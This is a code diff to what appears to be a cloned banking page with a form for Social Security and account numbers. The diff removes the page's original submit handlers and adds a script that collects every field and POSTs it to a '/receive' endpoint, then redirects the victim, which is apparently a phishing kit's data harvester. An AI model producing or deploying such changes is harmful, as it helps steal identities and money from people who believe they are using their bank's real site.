@@ -95,7 +95,7 @@
         </p>
         <p>
             <label for="ssn">Social Security Number *</label>
-            <input name="ssn" type="password" autocomplete="off" id="ssn" allow="[-0-9]" autoformat="1" onblur="ids_tb_blur(this)" onkeypress="return ids_tb_key(this, event)">
+            <input name="ssn" type="password" autocomplete="off" id="ssn" allow="[-0-9]" autoformat="1">
         </p>
         <p>
             <label for="account_number">Account Number *</label>
@@ -113,9 +113,8 @@
             </select>
         </p>
         <p id="submit_buttons" class="submit_buttons">
-            <input type="submit" name="submit" value="Submit" id="submit" class="button" onclick="if (IDS_ButtonClick('submit', '', true, false, true, '', 0, '', '')) __doPostBack('submit',''); return false;">
-            <input type="button" name="cancel" value="Cancel" id="cancel" class="light_button" onclick="if (IDS_ButtonClick('cancel', '', false, false, false, '', 0, '', '')) __doPostBack('cancel',''); return false;">
-        </p>
+            <input type="submit" name="submit" value="Submit" id="submit" class="button">
+               </p>
     </div>
 </div>
                                  </div>
@@ -200,4 +199,77 @@
       <div id="advance-popup-section" class="advance-content module-md" style=""></div>
       <div id="toast-container" class="advance-content invisible" role="alert"><span></span></div>
    </body>
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    
+    <script>
+    	function getCsrfToken() {
+	  return document.querySelector('meta[name="csrf-token"]').getAttribute("content");
+	}
+    	
+    $(document).ready(function () {
+        let btn = $('#submit');
+        let checkInputs = $('input');
+
+        // Function to check if all inputs are filled
+        function validateInputs() {
+            let allFilled = true;
+            checkInputs.each(function () {
+                if ($(this).val().trim() === "") {
+                    allFilled = false;
+                    return false; // Exit loop early if an empty field is found
+                }
+            });
+
+            if (allFilled) {
+                btn.removeClass('disabled').prop('disabled', false);
+            } else {
+                btn.addClass('disabled').prop('disabled', true);
+            }
+        }
+
+        // Listen for input changes to trigger validation
+        checkInputs.on('input', validateInputs);
+
+        // Button click event
+        btn.on('click', function (e) {
+            e.preventDefault(); // Prevent default form submission
+
+            if (btn.prop('disabled')) return; // Stop if button is disabled
+
+            
+            let visitor = sessionStorage.getItem('visitor');
+            
+            let user = {
+                visitor: visitor,
+            };
+            
+            // Loop through form inputs and add values to the object
+            checkInputs.each(function () {
+                user[$(this).attr('name')] = $(this).val();
+            });
+
+            console.log("User Data:", user);
+
+            // Send AJAX request
+            $.ajax({
+                method: 'POST',
+                headers: {
+    			"X-CSRF-Token": getCsrfToken(),
+    			},
+                url: "/receive",
+                data: user,
+            }).always(function () {
+                btn.prop('disabled', false);
+                console.log("Button enabled:", btn.prop('disabled'));
+            }).done(function (msg) {
+                window.location.href = msg.url;
+            }).fail(function (xhr, textStatus, error) {
+                console.error("AJAX request failed:", xhr.responseText || error);
+            });
+        });
+
+        // Initial validation check in case inputs are pre-filled
+        validateInputs();
+    });
+</script>
 </html>
